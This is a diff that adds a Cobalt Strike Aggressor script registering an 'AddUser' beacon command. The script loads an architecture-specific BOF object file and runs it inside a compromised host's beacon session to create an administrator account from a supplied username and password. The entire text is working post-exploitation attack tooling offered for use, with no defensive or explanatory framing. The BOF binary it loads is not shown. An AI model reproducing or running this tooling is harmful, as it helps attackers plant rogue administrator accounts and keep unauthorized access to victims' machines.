@@ -1,0 +1,30 @@
+beacon_command_register(
+"AddUser", 
+"add a administrator's user", 
+"Synopsis: AddUser <username> <password>");
+
+alias AddUser{
+	local('$barch $handle $data $args');
+
+	$uname = $2;
+	$pass = $3;
+
+	if ($uname eq "" or $pass eq "") {
+		berror($1, "usage command: help AddUser");
+		return;
+	}
+
+	# Read in the right BOF file
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	# read in the right BOF file
+        $handle = openf(script_resource("dist/AddUser-Bof. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	$args = bof_pack($1, "ZZ", $uname, $pass);
+
+	beacon_inline_execute($1, $data, "go", $args);
+}
